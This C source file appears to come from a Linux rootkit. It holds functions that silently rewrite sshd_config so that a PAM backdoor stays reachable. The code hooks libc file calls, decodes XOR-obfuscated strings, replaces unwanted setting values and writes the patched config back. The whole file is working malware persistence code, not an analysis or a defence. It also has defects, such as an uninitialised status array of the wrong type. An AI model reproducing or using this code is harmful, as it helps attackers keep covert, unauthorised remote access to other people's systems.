/*
 *   the following functions handle all of the work for patching sshd_config
 *   to make sure the PAM backdoor is accessible, AND STAYS THAT WAY.
 */

void addsetting(const char *setting, const char *value, char **buf){
    // add "<Setting> <Desired value>\n"
    char tmp[strlen(setting) + strlen(value) + 4];
    memset(tmp, 0, sizeof(tmp));
    snprintf(tmp, sizeof(tmp), "%s %s\n", setting, value);
    strcat(*buf, tmp);
}

size_t writesshd(const char *buf){
    FILE *fp;
    size_t count;
    char *sshd;
    hook(CFOPEN, CFWRITE);

    sshd = xordup(SSHD_CONFIG);
    if(!sshd) return 0;
    fp = call(CFOPEN, sshd, "w");
    clean(sshd);
    if(fp == NULL) return 0;
    count = (size_t)call(CFWRITE, buf, 1, strlen(buf), fp);
    
    fflush(fp);
    fclose(fp);
    return count;
}

/* this function reads sshd_config. if we can open it for reading, memory is allocated for it.
 *
 * each line is checked individually for bad settings.
 * the integer array 'res' contains statuses for the following outcomes of target settings:
 *   if a setting is spotted on the line & it is bad, the line is substituted for a more desireable setting of our own.
 *   if a setting is spotted on the line & it is ok, nothing is done to it.
 * if neither outcomes are met, it is assumed that the setting is missing & that we need to write in a new line for it ourselves. */
int sshdok(int res[], char **buf, size_t *sshdsize){
    hook(CFOPEN, C__XSTAT);

    // stat sshd_config so we can get the filesize.
    struct stat sshdstat;
    memset(&sshdstat, 0, sizeof(struct stat));
    char *sshd = xordup(SSHD_CONFIG);
    if(!sshd) return -1;
    int statstat = (long)call(C__XSTAT, _STAT_VER, sshd, &sshdstat);
    if(statstat < 0){
        clean(sshd);
        return -1;
    }

    FILE *fp; // FILE pointer for reading of sshd_config.
    char *curtarget,     // points to the current setting to patch.
         *curaval,  // points to value we don't want.
         *curtval,  // points to value we do want.
         *cursettingval, // points to value of the current setting.
         line[LINE_MAX], // buffer for current line of sshd_config.
         *linedup;       // copy of line buffer so we can strtok on it safely to get setting value.
    size_t targetlen;  // length of the current target setting.
    u_short skipline = 0;  // indicates whether or not to skip current line from file.

    fp = call(CFOPEN, sshd, "r");
    clean(sshd);
    if(fp == NULL) return -1;

    // file opened for reading ok. now allocate memory for it.
    *sshdsize = sshdstat.st_size;
#ifdef MAX_SSHD_SIZE
    *sshdsize>MAX_SSHD_SIZE ? *sshdsize=MAX_SSHD_SIZE : 0;
#endif
    *sshdsize += 45; // +45 bytes for possible additions of our own...
    *buf = malloc(*sshdsize);
    if(!*buf){
        fclose(fp);
        return -1;
    }
    memset(*buf, 0, *sshdsize);
    
    while(fgets(line, sizeof(line), fp) != NULL){
        /* lines are cool. unless they aren't... */
        skipline = 0;

        for(size_t i=0; i < PATCH_TARGETS_SIZE; i++){
            if(res[i] == 2 || res[i] == 1) // status of setting already determined. next.
                continue;

            /* curtarget is a specific setting within sshd_config
             * that we want to remain to our liking. no matter what. */
            curtarget = xordup(patch_targets[i]);
            if(!curtarget) break;
            targetlen = strlen(curtarget);

            /* check current line starts with a target setting to patch. */
            if(!strncmp(line, curtarget, targetlen)){
                linedup = strdup(line);
                if(!linedup){
                    clean(curtarget);
                    break;
                }

                // get the option from the line.
                cursettingval = strtok(linedup, " ");
                cursettingval = strtok(NULL, " "); // theoretically this will/should be "yes" or "no"

                /* check current setting value against values we don't want. */
                curaval = xordup(antival[i]);
                if(!curaval){
                    clean(linedup);
                    break;
                }
                char *st = strstr(cursettingval, curaval);
                clean(curaval);

                if(st != NULL){
                    clean(linedup);

                    curtval = xordup(targetval[i]);
                    if(!curtval){
                        clean(curtarget);
                        break;
                    }

                    addsetting(curtarget, curtval, buf);
                    clean(curtarget);
                    clean(curtval);

                    skipline = 1;
                    res[i] = 2;
                    break;
                }

                res[i] = 1;    // target setting is ok the way it is.
                clean(linedup);
                clean(curtarget);
                break;
            }
        }
        !skipline ? strcat(*buf, line) : 0;
    }
    fclose(fp);

    return 1;
}

/*
 *    this function does the actual writing of the patched sshd config.
 *    plus the addition of settings that were previously missing.
 */

void sshdpatch(void){
    if(rknomore()) return;
    char *sshdcontents; // stores contents of sshd_config.
    size_t sshdsize;    // stores filesize of sshd_config.
    u_short status[PATCH_TARGETS_SIZE]; // stores patch status of each setting.

    if(sshdok(status, &sshdcontents, &sshdsize) < 0)
        return;

    u_int nook = 0,       // number of settings that returned 'ok' (1).
          nopatched = 0;  // number of settings whose values have been patched. (2)
    for(size_t i=0; i<PATCH_TARGETS_SIZE; i++){
        switch(status[i]){
            case 1:
                ++nook;
                break;
            case 2:
                ++nopatched;
                break;
            default:
                addsetting(patch_targets[i], targetval[i], &sshdcontents);
        }
    }
    nook<PATCH_TARGETS_SIZE ? writesshd(sshdcontents) : 0;
    bfree(sshdcontents, sshdsize);
}
